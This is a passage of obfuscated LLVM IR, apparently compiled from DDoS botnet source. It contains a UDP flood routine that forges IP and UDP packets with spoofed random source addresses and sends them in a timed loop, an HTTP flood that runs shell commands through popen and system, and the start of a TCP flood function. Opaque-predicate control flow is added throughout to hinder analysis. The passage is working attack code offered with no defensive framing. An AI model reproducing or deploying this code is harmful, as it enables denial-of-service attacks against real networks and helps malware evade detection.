  %223 = sub i32 %221, 1
  %224 = mul i32 %221, %223
  %225 = urem i32 %224, 2
  %226 = icmp eq i32 %225, 0
  %227 = icmp slt i32 %222, 10
  %228 = or i1 %226, %227
  br i1 %228, label %originalBB47, label %originalBB47alteredBB

originalBB47:                                     ; preds = %originalBB47alteredBB, %220
  %229 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %230 = call i32 @rand_cmwc()
  %231 = xor i32 %229, %230
  call void @srand(i32 %231) #4
  %232 = call i32 @rand() #4
  call void @init_rand(i32 %232)
  %233 = load i32, i32* @x.69
  %234 = load i32, i32* @y.70
  %235 = sub i32 %233, 1
  %236 = mul i32 %233, %235
  %237 = urem i32 %236, 2
  %238 = icmp eq i32 %237, 0
  %239 = icmp slt i32 %234, 10
  %240 = or i1 %238, %239
  br i1 %240, label %originalBBpart261, label %originalBB47alteredBB

originalBBpart261:                                ; preds = %originalBB47
  br label %216

; <label>:241:                                    ; preds = %216
  %242 = load i32, i32* %18, align 4
  %243 = icmp eq i32 %242, 0
  br i1 %243, label %244, label %245

; <label>:244:                                    ; preds = %241
  store i32 0, i32* %30, align 4
  br label %267

; <label>:245:                                    ; preds = %241
  %246 = load i32, i32* @x.69
  %247 = load i32, i32* @y.70
  %248 = sub i32 %246, 1
  %249 = mul i32 %246, %248
  %250 = urem i32 %249, 2
  %251 = icmp eq i32 %250, 0
  %252 = icmp slt i32 %247, 10
  %253 = or i1 %251, %252
  br i1 %253, label %originalBB63, label %originalBB63alteredBB

originalBB63:                                     ; preds = %originalBB63alteredBB, %245
  %254 = load i32, i32* %18, align 4
  %255 = sub nsw i32 32, %254
  %256 = shl i32 1, %255
  %257 = sub nsw i32 %256, 1
  %258 = xor i32 %257, -1
  store i32 %258, i32* %30, align 4
  %259 = load i32, i32* @x.69
  %260 = load i32, i32* @y.70
  %261 = sub i32 %259, 1
  %262 = mul i32 %259, %261
  %263 = urem i32 %262, 2
  %264 = icmp eq i32 %263, 0
  %265 = icmp slt i32 %260, 10
  %266 = or i1 %264, %265
  br i1 %266, label %originalBBpart291, label %originalBB63alteredBB

originalBBpart291:                                ; preds = %originalBB63
  br label %267

; <label>:267:                                    ; preds = %originalBBpart291, %244
  %268 = load i32, i32* %19, align 4
  %269 = sext i32 %268 to i64
  %270 = add i64 28, %269
  %271 = call i8* @llvm.stacksave()
  store i8* %271, i8** %31, align 8
  %272 = alloca i8, i64 %270, align 16
  %273 = bitcast i8* %272 to %struct.iphdr*
  store %struct.iphdr* %273, %struct.iphdr** %32, align 8
  %274 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %275 = bitcast %struct.iphdr* %274 to i8*
  %276 = getelementptr i8, i8* %275, i64 20
  %277 = bitcast i8* %276 to %struct.udphdr*
  store %struct.udphdr* %277, %struct.udphdr** %33, align 8
  %278 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %279 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %21, i32 0, i32 2
  %280 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %279, i32 0, i32 0
  %281 = load i32, i32* %280, align 4
  %282 = load i32, i32* %30, align 4
  %283 = call i32 @getRandomIP(i32 %282)
  %284 = call i32 @htonl(i32 %283) #13
  %285 = load i32, i32* %19, align 4
  %286 = sext i32 %285 to i64
  %287 = add i64 8, %286
  %288 = trunc i64 %287 to i32
  call void @makeIPPacket(%struct.iphdr* %278, i32 %281, i32 %284, i8 zeroext 17, i32 %288)
  %289 = load i32, i32* %19, align 4
  %290 = sext i32 %289 to i64
  %291 = add i64 8, %290
  %292 = trunc i64 %291 to i16
  %293 = call zeroext i16 @htons(i16 zeroext %292) #13
  %294 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %295 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %294, i32 0, i32 0
  %296 = bitcast %union.anon.2* %295 to %struct.anon.3*
  %297 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %296, i32 0, i32 2
  store i16 %293, i16* %297, align 2
  %298 = call i32 @rand_cmwc()
  %299 = trunc i32 %298 to i16
  %300 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %301 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %300, i32 0, i32 0
  %302 = bitcast %union.anon.2* %301 to %struct.anon.3*
  %303 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %302, i32 0, i32 0
  store i16 %299, i16* %303, align 2
  %304 = load i32, i32* %16, align 4
  %305 = icmp eq i32 %304, 0
  br i1 %305, label %306, label %324

; <label>:306:                                    ; preds = %267
  %307 = load i32, i32* @x.69
  %308 = load i32, i32* @y.70
  %309 = sub i32 %307, 1
  %310 = mul i32 %307, %309
  %311 = urem i32 %310, 2
  %312 = icmp eq i32 %311, 0
  %313 = icmp slt i32 %308, 10
  %314 = or i1 %312, %313
  br i1 %314, label %originalBB93, label %originalBB93alteredBB

originalBB93:                                     ; preds = %originalBB93alteredBB, %306
  %315 = call i32 @rand_cmwc()
  %316 = load i32, i32* @x.69
  %317 = load i32, i32* @y.70
  %318 = sub i32 %316, 1
  %319 = mul i32 %316, %318
  %320 = urem i32 %319, 2
  %321 = icmp eq i32 %320, 0
  %322 = icmp slt i32 %317, 10
  %323 = or i1 %321, %322
  br i1 %323, label %originalBBpart295, label %originalBB93alteredBB

originalBBpart295:                                ; preds = %originalBB93
  br label %345

; <label>:324:                                    ; preds = %267
  %325 = load i32, i32* @x.69
  %326 = load i32, i32* @y.70
  %327 = sub i32 %325, 1
  %328 = mul i32 %325, %327
  %329 = urem i32 %328, 2
  %330 = icmp eq i32 %329, 0
  %331 = icmp slt i32 %326, 10
  %332 = or i1 %330, %331
  br i1 %332, label %originalBB97, label %originalBB97alteredBB

originalBB97:                                     ; preds = %originalBB97alteredBB, %324
  %333 = load i32, i32* %16, align 4
  %334 = trunc i32 %333 to i16
  %335 = call zeroext i16 @htons(i16 zeroext %334) #13
  %336 = zext i16 %335 to i32
  %337 = load i32, i32* @x.69
  %338 = load i32, i32* @y.70
  %339 = sub i32 %337, 1
  %340 = mul i32 %337, %339
  %341 = urem i32 %340, 2
  %342 = icmp eq i32 %341, 0
  %343 = icmp slt i32 %338, 10
  %344 = or i1 %342, %343
  br i1 %344, label %originalBBpart299, label %originalBB97alteredBB

originalBBpart299:                                ; preds = %originalBB97
  br label %345

; <label>:345:                                    ; preds = %originalBBpart299, %originalBBpart295
  %346 = phi i32 [ %315, %originalBBpart295 ], [ %336, %originalBBpart299 ]
  %347 = trunc i32 %346 to i16
  %348 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %349 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %348, i32 0, i32 0
  %350 = bitcast %union.anon.2* %349 to %struct.anon.3*
  %351 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %350, i32 0, i32 1
  store i16 %347, i16* %351, align 2
  %352 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %353 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %352, i32 0, i32 0
  %354 = bitcast %union.anon.2* %353 to %struct.anon.3*
  %355 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %354, i32 0, i32 3
  store i16 0, i16* %355, align 2
  %356 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %357 = bitcast %struct.udphdr* %356 to i8*
  %358 = getelementptr inbounds i8, i8* %357, i64 8
  %359 = load i32, i32* %19, align 4
  call void @makeRandomStr(i8* %358, i32 %359)
  %360 = bitcast i8* %272 to i16*
  %361 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %362 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %361, i32 0, i32 2
  %363 = load i16, i16* %362, align 2
  %364 = zext i16 %363 to i32
  %365 = call zeroext i16 @csum(i16* %360, i32 %364)
  %366 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %367 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %366, i32 0, i32 7
  store i16 %365, i16* %367, align 2
  %368 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %369 = load i32, i32* %17, align 4
  %370 = add nsw i32 %368, %369
  store i32 %370, i32* %34, align 4
  store i32 0, i32* %35, align 4
  br label %371

; <label>:371:                                    ; preds = %472, %originalBBpart2111, %345
  %372 = load i32, i32* @x.69
  %373 = load i32, i32* @y.70
  %374 = sub i32 %372, 1
  %375 = mul i32 %372, %374
  %376 = urem i32 %375, 2
  %377 = icmp eq i32 %376, 0
  %378 = icmp slt i32 %373, 10
  %379 = or i1 %377, %378
  br i1 %379, label %originalBB101, label %originalBB101alteredBB

originalBB101:                                    ; preds = %originalBB101alteredBB, %371
  %380 = load i32, i32* @x.69
  %381 = load i32, i32* @y.70
  %382 = sub i32 %380, 1
  %383 = mul i32 %380, %382
  %384 = urem i32 %383, 2
  %385 = icmp eq i32 %384, 0
  %386 = icmp slt i32 %381, 10
  %387 = or i1 %385, %386
  br i1 %387, label %originalBBpart2103, label %originalBB101alteredBB

originalBBpart2103:                               ; preds = %originalBB101
  br label %388

; <label>:388:                                    ; preds = %originalBBpart2103
  %389 = load i32, i32* %27, align 4
  %390 = bitcast %struct.sockaddr_in* %21 to %struct.sockaddr*
  %391 = call i64 @sendto(i32 %389, i8* %272, i64 %270, i32 0, %struct.sockaddr* %390, i32 16)
  %392 = call i32 @rand_cmwc()
  %393 = trunc i32 %392 to i16
  %394 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %395 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %394, i32 0, i32 0
  %396 = bitcast %union.anon.2* %395 to %struct.anon.3*
  %397 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %396, i32 0, i32 0
  store i16 %393, i16* %397, align 2
  %398 = load i32, i32* %16, align 4
  %399 = icmp eq i32 %398, 0
  br i1 %399, label %400, label %402

; <label>:400:                                    ; preds = %388
  %401 = call i32 @rand_cmwc()
  br label %407

; <label>:402:                                    ; preds = %388
  %403 = load i32, i32* %16, align 4
  %404 = trunc i32 %403 to i16
  %405 = call zeroext i16 @htons(i16 zeroext %404) #13
  %406 = zext i16 %405 to i32
  br label %407

; <label>:407:                                    ; preds = %402, %400
  %408 = phi i32 [ %401, %400 ], [ %406, %402 ]
  %409 = load i32, i32* @x.69
  %410 = load i32, i32* @y.70
  %411 = sub i32 %409, 1
  %412 = mul i32 %409, %411
  %413 = urem i32 %412, 2
  %414 = icmp eq i32 %413, 0
  %415 = icmp slt i32 %410, 10
  %416 = or i1 %414, %415
  br i1 %416, label %originalBB105, label %originalBB105alteredBB

originalBB105:                                    ; preds = %originalBB105alteredBB, %407
  %417 = trunc i32 %408 to i16
  %418 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %419 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %418, i32 0, i32 0
  %420 = bitcast %union.anon.2* %419 to %struct.anon.3*
  %421 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %420, i32 0, i32 1
  store i16 %417, i16* %421, align 2
  %422 = call i32 @rand_cmwc()
  %423 = trunc i32 %422 to i16
  %424 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %425 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %424, i32 0, i32 3
  store i16 %423, i16* %425, align 4
  %426 = load i32, i32* %30, align 4
  %427 = call i32 @getRandomIP(i32 %426)
  %428 = call i32 @htonl(i32 %427) #13
  %429 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %430 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %429, i32 0, i32 8
  store i32 %428, i32* %430, align 4
  %431 = bitcast i8* %272 to i16*
  %432 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %433 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %432, i32 0, i32 2
  %434 = load i16, i16* %433, align 2
  %435 = zext i16 %434 to i32
  %436 = call zeroext i16 @csum(i16* %431, i32 %435)
  %437 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %438 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %437, i32 0, i32 7
  store i16 %436, i16* %438, align 2
  %439 = load i32, i32* %35, align 4
  %440 = load i32, i32* %22, align 4
  %441 = icmp eq i32 %439, %440
  %442 = load i32, i32* @x.69
  %443 = load i32, i32* @y.70
  %444 = sub i32 %442, 1
  %445 = mul i32 %442, %444
  %446 = urem i32 %445, 2
  %447 = icmp eq i32 %446, 0
  %448 = icmp slt i32 %443, 10
  %449 = or i1 %447, %448
  br i1 %449, label %originalBBpart2107, label %originalBB105alteredBB

originalBBpart2107:                               ; preds = %originalBB105
  br i1 %441, label %450, label %472

; <label>:450:                                    ; preds = %originalBBpart2107
  %451 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %452 = load i32, i32* %34, align 4
  %453 = icmp sgt i32 %451, %452
  br i1 %453, label %454, label %455

; <label>:454:                                    ; preds = %450
  br label %475

; <label>:455:                                    ; preds = %450
  %456 = load i32, i32* @x.69
  %457 = load i32, i32* @y.70
  %458 = sub i32 %456, 1
  %459 = mul i32 %456, %458
  %460 = urem i32 %459, 2
  %461 = icmp eq i32 %460, 0
  %462 = icmp slt i32 %457, 10
  %463 = or i1 %461, %462
  br i1 %463, label %originalBB109, label %originalBB109alteredBB

originalBB109:                                    ; preds = %originalBB109alteredBB, %455
  store i32 0, i32* %35, align 4
  %464 = load i32, i32* @x.69
  %465 = load i32, i32* @y.70
  %466 = sub i32 %464, 1
  %467 = mul i32 %464, %466
  %468 = urem i32 %467, 2
  %469 = icmp eq i32 %468, 0
  %470 = icmp slt i32 %465, 10
  %471 = or i1 %469, %470
  br i1 %471, label %originalBBpart2111, label %originalBB109alteredBB

originalBBpart2111:                               ; preds = %originalBB109
  br label %371

; <label>:472:                                    ; preds = %originalBBpart2107
  %473 = load i32, i32* %35, align 4
  %474 = add i32 %473, 1
  store i32 %474, i32* %35, align 4
  br label %371

; <label>:475:                                    ; preds = %454
  %476 = load i32, i32* @x.69
  %477 = load i32, i32* @y.70
  %478 = sub i32 %476, 1
  %479 = mul i32 %476, %478
  %480 = urem i32 %479, 2
  %481 = icmp eq i32 %480, 0
  %482 = icmp slt i32 %477, 10
  %483 = or i1 %481, %482
  br i1 %483, label %originalBB113, label %originalBB113alteredBB

originalBB113:                                    ; preds = %originalBB113alteredBB, %475
  %484 = load i8*, i8** %31, align 8
  call void @llvm.stackrestore(i8* %484)
  %485 = load i32, i32* @x.69
  %486 = load i32, i32* @y.70
  %487 = sub i32 %485, 1
  %488 = mul i32 %485, %487
  %489 = urem i32 %488, 2
  %490 = icmp eq i32 %489, 0
  %491 = icmp slt i32 %486, 10
  %492 = or i1 %490, %491
  br i1 %492, label %originalBBpart2115, label %originalBB113alteredBB

originalBBpart2115:                               ; preds = %originalBB113
  br label %493

; <label>:493:                                    ; preds = %originalBBpart2115, %196, %188, %183, %82, %72, %61
  %494 = load i32, i32* @x.69
  %495 = load i32, i32* @y.70
  %496 = sub i32 %494, 1
  %497 = mul i32 %494, %496
  %498 = urem i32 %497, 2
  %499 = icmp eq i32 %498, 0
  %500 = icmp slt i32 %495, 10
  %501 = or i1 %499, %500
  br i1 %501, label %originalBB117, label %originalBB117alteredBB

originalBB117:                                    ; preds = %originalBB117alteredBB, %493
  %502 = load i32, i32* @x.69
  %503 = load i32, i32* @y.70
  %504 = sub i32 %502, 1
  %505 = mul i32 %502, %504
  %506 = urem i32 %505, 2
  %507 = icmp eq i32 %506, 0
  %508 = icmp slt i32 %503, 10
  %509 = or i1 %507, %508
  br i1 %509, label %originalBBpart2119, label %originalBB117alteredBB

originalBBpart2119:                               ; preds = %originalBB117
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %6
  %510 = alloca i8*, align 8
  %511 = alloca i32, align 4
  %512 = alloca i32, align 4
  %513 = alloca i32, align 4
  %514 = alloca i32, align 4
  %515 = alloca i32, align 4
  %516 = alloca %struct.sockaddr_in, align 4
  %517 = alloca i32, align 4
  %518 = alloca i32, align 4
  %519 = alloca i8*, align 8
  %520 = alloca i32, align 4
  %521 = alloca i32, align 4
  %522 = alloca i32, align 4
  %523 = alloca i32, align 4
  %524 = alloca i32, align 4
  %525 = alloca i32, align 4
  %526 = alloca i8*, align 8
  %527 = alloca %struct.iphdr*, align 8
  %528 = alloca %struct.udphdr*, align 8
  %529 = alloca i32, align 4
  %530 = alloca i32, align 4
  store i8* %0, i8** %510, align 8
  store i32 %1, i32* %511, align 4
  store i32 %2, i32* %512, align 4
  store i32 %3, i32* %513, align 4
  store i32 %4, i32* %514, align 4
  store i32 %5, i32* %515, align 4
  %531 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %516, i32 0, i32 0
  store i16 2, i16* %531, align 4
  %532 = load i32, i32* %511, align 4
  %533 = icmp eq i32 %532, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %83
  %534 = load i8*, i8** %24, align 8
  %535 = load i32, i32* %19, align 4
  %_ = sub i32 %535, 1
  %gen = mul i32 %_, 1
  %_2 = sub i32 %535, 1
  %gen3 = mul i32 %_2, 1
  %_4 = sub i32 %535, 1
  %gen5 = mul i32 %_4, 1
  %_6 = sub i32 0, %535
  %gen7 = add i32 %_6, 1
  %_8 = sub i32 0, %535
  %gen9 = add i32 %_8, 1
  %536 = add nsw i32 %535, 1
  %537 = sext i32 %536 to i64
  call void @llvm.memset.p0i8.i64(i8* %534, i8 0, i64 %537, i32 1, i1 false)
  %538 = load i8*, i8** %24, align 8
  %539 = load i32, i32* %19, align 4
  call void @makeRandomStr(i8* %538, i32 %539)
  %540 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %541 = load i32, i32* %17, align 4
  %_10 = shl i32 %540, %541
  %_11 = sub i32 %540, %541
  %gen12 = mul i32 %_11, %541
  %_13 = shl i32 %540, %541
  %542 = add nsw i32 %540, %541
  store i32 %542, i32* %25, align 4
  store i32 0, i32* %26, align 4
  br label %originalBB1

originalBB17alteredBB:                            ; preds = %originalBB17, %122
  %543 = call i32 @rand_cmwc()
  %544 = trunc i32 %543 to i16
  %545 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %21, i32 0, i32 1
  store i16 %544, i16* %545, align 2
  br label %originalBB17

originalBB21alteredBB:                            ; preds = %originalBB21, %147
  store i32 0, i32* %26, align 4
  br label %originalBB21

originalBB25alteredBB:                            ; preds = %originalBB25, %164
  %546 = load i32, i32* %26, align 4
  %_26 = sub i32 %546, 1
  %gen27 = mul i32 %_26, 1
  %_28 = sub i32 %546, 1
  %gen29 = mul i32 %_28, 1
  %_30 = shl i32 %546, 1
  %_31 = shl i32 %546, 1
  %_32 = sub i32 %546, 1
  %gen33 = mul i32 %_32, 1
  %_34 = sub i32 0, %546
  %gen35 = add i32 %_34, 1
  %_36 = shl i32 %546, 1
  %_37 = shl i32 %546, 1
  %_38 = sub i32 %546, 1
  %gen39 = mul i32 %_38, 1
  %547 = add i32 %546, 1
  store i32 %547, i32* %26, align 4
  br label %originalBB25

originalBB43alteredBB:                            ; preds = %originalBB43, %199
  store i32 50, i32* %29, align 4
  br label %originalBB43

originalBB47alteredBB:                            ; preds = %originalBB47, %220
  %548 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %549 = call i32 @rand_cmwc()
  %_48 = sub i32 0, %548
  %gen49 = add i32 %_48, %549
  %_50 = sub i32 0, %548
  %gen51 = add i32 %_50, %549
  %_52 = sub i32 0, %548
  %gen53 = add i32 %_52, %549
  %_54 = sub i32 %548, %549
  %gen55 = mul i32 %_54, %549
  %_56 = sub i32 0, %548
  %gen57 = add i32 %_56, %549
  %_58 = sub i32 0, %548
  %gen59 = add i32 %_58, %549
  %550 = xor i32 %548, %549
  call void @srand(i32 %550) #4
  %551 = call i32 @rand() #4
  call void @init_rand(i32 %551)
  br label %originalBB47

originalBB63alteredBB:                            ; preds = %originalBB63, %245
  %552 = load i32, i32* %18, align 4
  %_64 = sub i32 0, 32
  %gen65 = add i32 %_64, %552
  %_66 = sub i32 0, 32
  %gen67 = add i32 %_66, %552
  %_68 = shl i32 32, %552
  %553 = sub nsw i32 32, %552
  %_69 = sub i32 0, 1
  %gen70 = add i32 %_69, %553
  %554 = shl i32 1, %553
  %_71 = shl i32 %554, 1
  %_72 = sub i32 %554, 1
  %gen73 = mul i32 %_72, 1
  %_74 = sub i32 %554, 1
  %gen75 = mul i32 %_74, 1
  %_76 = sub i32 %554, 1
  %gen77 = mul i32 %_76, 1
  %_78 = shl i32 %554, 1
  %_79 = shl i32 %554, 1
  %555 = sub nsw i32 %554, 1
  %_80 = shl i32 %555, -1
  %_81 = sub i32 %555, -1
  %gen82 = mul i32 %_81, -1
  %_83 = shl i32 %555, -1
  %_84 = sub i32 0, %555
  %gen85 = add i32 %_84, -1
  %_86 = shl i32 %555, -1
  %_87 = shl i32 %555, -1
  %_88 = sub i32 0, %555
  %gen89 = add i32 %_88, -1
  %556 = xor i32 %555, -1
  store i32 %556, i32* %30, align 4
  br label %originalBB63

originalBB93alteredBB:                            ; preds = %originalBB93, %306
  %557 = call i32 @rand_cmwc()
  br label %originalBB93

originalBB97alteredBB:                            ; preds = %originalBB97, %324
  %558 = load i32, i32* %16, align 4
  %559 = trunc i32 %558 to i16
  %560 = call zeroext i16 @htons(i16 zeroext %559) #13
  %561 = zext i16 %560 to i32
  br label %originalBB97

originalBB101alteredBB:                           ; preds = %originalBB101, %371
  br label %originalBB101

originalBB105alteredBB:                           ; preds = %originalBB105, %407
  %562 = trunc i32 %408 to i16
  %563 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %564 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %563, i32 0, i32 0
  %565 = bitcast %union.anon.2* %564 to %struct.anon.3*
  %566 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %565, i32 0, i32 1
  store i16 %562, i16* %566, align 2
  %567 = call i32 @rand_cmwc()
  %568 = trunc i32 %567 to i16
  %569 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %570 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %569, i32 0, i32 3
  store i16 %568, i16* %570, align 4
  %571 = load i32, i32* %30, align 4
  %572 = call i32 @getRandomIP(i32 %571)
  %573 = call i32 @htonl(i32 %572) #13
  %574 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %575 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %574, i32 0, i32 8
  store i32 %573, i32* %575, align 4
  %576 = bitcast i8* %272 to i16*
  %577 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %578 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %577, i32 0, i32 2
  %579 = load i16, i16* %578, align 2
  %580 = zext i16 %579 to i32
  %581 = call zeroext i16 @csum(i16* %576, i32 %580)
  %582 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %583 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %582, i32 0, i32 7
  store i16 %581, i16* %583, align 2
  %584 = load i32, i32* %35, align 4
  %585 = load i32, i32* %22, align 4
  %586 = icmp eq i32 %584, %585
  br label %originalBB105

originalBB109alteredBB:                           ; preds = %originalBB109, %455
  store i32 0, i32* %35, align 4
  br label %originalBB109

originalBB113alteredBB:                           ; preds = %originalBB113, %475
  %587 = load i8*, i8** %31, align 8
  call void @llvm.stackrestore(i8* %587)
  br label %originalBB113

originalBB117alteredBB:                           ; preds = %originalBB117, %493
  br label %originalBB117
}

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #5

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #3

; Function Attrs: nounwind
declare void @srand(i32) #3

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #8

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #4

; Function Attrs: noinline nounwind uwtable
define void @sendHTTP(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca %struct._IO_FILE*, align 8
  %7 = alloca [80 x i8], align 16
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  %8 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %9 = load i32, i32* %4, align 4
  %10 = add nsw i32 %8, %9
  store i32 %10, i32* %5, align 4
  %11 = getelementptr inbounds [80 x i8], [80 x i8]* %7, i32 0, i32 0
  %12 = call i32 (i8*, i8*, ...) @sprintf(i8* %11, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.39, i32 0, i32 0)) #4
  %13 = getelementptr inbounds [80 x i8], [80 x i8]* %7, i32 0, i32 0
  %14 = load i8*, i8** %3, align 8
  %15 = call i8* @strcat(i8* %13, i8* %14) #4
  %16 = getelementptr inbounds [80 x i8], [80 x i8]* %7, i32 0, i32 0
  %17 = call i8* @strcat(i8* %16, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.40, i32 0, i32 0)) #4
  %18 = getelementptr inbounds [80 x i8], [80 x i8]* %7, i32 0, i32 0
  %19 = call %struct._IO_FILE* @popen(i8* %18, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.41, i32 0, i32 0))
  store %struct._IO_FILE* %19, %struct._IO_FILE** %6, align 8
  br label %20

; <label>:20:                                     ; preds = %24, %2
  %21 = load i32, i32* %5, align 4
  %22 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %23 = icmp sgt i32 %21, %22
  br i1 %23, label %24, label %27

; <label>:24:                                     ; preds = %20
  %25 = getelementptr inbounds [80 x i8], [80 x i8]* %7, i32 0, i32 0
  %26 = call i32 @system(i8* %25)
  br label %20

; <label>:27:                                     ; preds = %20
  ret void
}

; Function Attrs: nounwind
declare i32 @sprintf(i8*, i8*, ...) #3

; Function Attrs: nounwind
declare i8* @strcat(i8*, i8*) #3

declare %struct._IO_FILE* @popen(i8*, i8*) #5

declare i32 @system(i8*) #5

; Function Attrs: noinline nounwind uwtable
define void @sendTCP(i8*, i32, i32, i32, i8*, i32, i32) #0 {
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca %struct.iphdr*, align 8
  %22 = alloca %struct.tcphdr*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  store i8* %0, i8** %8, align 8
  store i32 %1, i32* %9, align 4
  store i32 %2, i32* %10, align 4
  store i32 %3, i32* %11, align 4
  store i8* %4, i8** %12, align 8
  store i32 %5, i32* %13, align 4
  store i32 %6, i32* %14, align 4
  %26 = load i32, i32* %14, align 4
  store i32 %26, i32* %15, align 4
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %9, align 4
  %29 = icmp eq i32 %28, 0
  br i1 %29, label %30, label %50

; <label>:30:                                     ; preds = %7
  %31 = load i32, i32* @x.73
  %32 = load i32, i32* @y.74
  %33 = sub i32 %31, 1
  %34 = mul i32 %31, %33
  %35 = urem i32 %34, 2
  %36 = icmp eq i32 %35, 0
  %37 = icmp slt i32 %32, 10
  %38 = or i1 %36, %37
  br i1 %38, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %30
  %39 = call i32 @rand_cmwc()
  %40 = trunc i32 %39 to i16
  %41 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %40, i16* %41, align 2
  %42 = load i32, i32* @x.73
  %43 = load i32, i32* @y.74
  %44 = sub i32 %42, 1
  %45 = mul i32 %42, %44
  %46 = urem i32 %45, 2
  %47 = icmp eq i32 %46, 0
  %48 = icmp slt i32 %43, 10
  %49 = or i1 %47, %48
  br i1 %49, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %71

; <label>:50:                                     ; preds = %7
  %51 = load i32, i32* @x.73
  %52 = load i32, i32* @y.74
  %53 = sub i32 %51, 1
  %54 = mul i32 %51, %53
  %55 = urem i32 %54, 2
  %56 = icmp eq i32 %55, 0
  %57 = icmp slt i32 %52, 10
  %58 = or i1 %56, %57
  br i1 %58, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %50
  %59 = load i32, i32* %9, align 4
  %60 = trunc i32 %59 to i16
  %61 = call zeroext i16 @htons(i16 zeroext %60) #13
  %62 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %61, i16* %62, align 2
  %63 = load i32, i32* @x.73
  %64 = load i32, i32* @y.74
  %65 = sub i32 %63, 1
  %66 = mul i32 %63, %65
  %67 = urem i32 %66, 2
  %68 = icmp eq i32 %67, 0
  %69 = icmp slt i32 %64, 10
  %70 = or i1 %68, %69
  br i1 %70, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %71

; <label>:71:                                     ; preds = %originalBBpart24, %originalBBpart2
  %72 = load i32, i32* @x.73
  %73 = load i32, i32* @y.74
  %74 = sub i32 %72, 1
  %75 = mul i32 %72, %74
  %76 = urem i32 %75, 2
  %77 = icmp eq i32 %76, 0
